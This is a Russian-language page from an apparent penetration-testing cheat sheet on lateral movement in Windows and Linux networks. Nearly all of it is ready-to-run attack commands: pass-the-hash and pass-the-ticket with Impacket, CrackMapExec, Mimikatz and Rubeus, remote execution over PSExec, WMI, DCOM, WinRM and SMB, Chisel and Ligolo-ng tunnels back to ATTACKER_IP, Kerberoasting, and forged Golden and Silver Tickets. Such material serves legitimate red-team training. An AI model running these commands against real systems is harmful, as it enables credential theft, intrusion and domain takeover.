# ➡️ Этап 4: Боковое перемещение

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[Английский оригинал](../04-Lateral-Movement.md) • [Русский указатель](../../README.ru.md)
[🇹🇷 Türkçe Sürüm](04-Lateral-Movement.tr.md) • [🇬🇷 Ελληνικά](04-Lateral-Movement.el.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Цель:** Перейти со скомпрометированной системы на другие системы в сети.

---

## 🔑 Перемещение с использованием учётных данных

**Термины:** Pass-the-Hash — аутентификация с помощью хэша; Pass-the-Ticket — использование билета Kerberos; Overpass-the-Hash — получение билета с помощью ключевого материала учётной записи; Pass-the-Certificate — аутентификация сертификатом. Kerberoasting и AS-REP Roasting относятся к получению данных для автономного подбора пароля; Golden Ticket и Silver Ticket — поддельные билеты Kerberos.

### Pass-the-Hash (PTH)
```bash
# Impacket PSExec с хэшем
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)
```powershell
# Экспортировать билет из памяти (Mimikatz)
sekurlsa::tickets /export

# Импортировать билет
kerberos::ptt ticket.kirbi

# Или с помощью Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Проверить билет
klist
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Mimikatz — запросить TGT с помощью NTLM-хэша
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate
```bash
# Использовать сертификат для аутентификации
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# С помощью Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ Способы удалённого выполнения

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec (менее заметный вариант по описанию оригинала)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM с паролем
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM с хэшем
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# Удалённое взаимодействие PowerShell
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# Выполнение команд через CrackMapExec
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# Копирование файлов через SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# В стиле PsExec
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# С NTLM-хэшем (режим Restricted Admin)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Включить RDP удалённо
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# SSH с паролем
ssh user@192.168.1.10

# SSH с ключом
ssh -i id_rsa user@192.168.1.10

# SSH-туннелирование и pivoting (доступ через промежуточный узел)
ssh -D 9050 user@192.168.1.10  # SOCKS-прокси
ssh -L 8080:internal:80 user@192.168.1.10  # Local port forward
```

---

## 🔄 Доступ к сети через промежуточный узел (pivoting)

### SSH-туннелирование
```bash
# Локальное перенаправление порта (доступ к internal:80 через localhost:8080)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Динамический SOCKS-прокси
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Удалённое перенаправление порта
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# На машине атакующего (сервер)
./chisel server --reverse --port 8080

# На целевой машине (клиент)
./chisel client ATTACKER_IP:8080 R:socks

# Использование с proxychains
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# На машине атакующего
./proxy -selfcert

# На целевой машине
./agent -connect ATTACKER_IP:11601 -ignore-cert

# В консоли прокси
session
start
```

### Pivoting через Metasploit
```bash
# Добавить маршрут через сеанс meterpreter
run autoroute -s 192.168.2.0/24

# Или вручную
route add 192.168.2.0 255.255.255.0 1

# SOCKS-прокси
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Атаки на Kerberos

### Kerberoasting
```bash
# Получить сервисные билеты
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Подобрать пароль с помощью hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Найти пользователей без предварительной аутентификации
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Подбор пароля
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket
```powershell
# Сначала получить хэш krbtgt, затем:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket
```powershell
# Создать билет для конкретной службы
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 Краткий справочник

### Методы бокового перемещения

| Метод | Порт | Инструмент |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Необходимые учётные данные

| Способ | Требование |
|--------|-------------|
| Pass-the-Hash | NTLM-хэш |
| Pass-the-Ticket | Билет Kerberos |
| PSExec | Права администратора и доступ к SMB |
| WinRM | Включённый WinRM и права администратора |
| RDP | Включённый RDP и членство в группе доступа RDP |

---

## 🔗 Связанные шпаргалки

- [Impacket](../../Impacket/README.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/README.md)
- [Rubeus](../../Rubeus/README.md)

---

**Предыдущий этап:** [← 03 - Повышение привилегий](./03-Privilege-Escalation.ru.md)

**Следующий этап:** [05 - Закрепление →](./05-Persistence.ru.md)
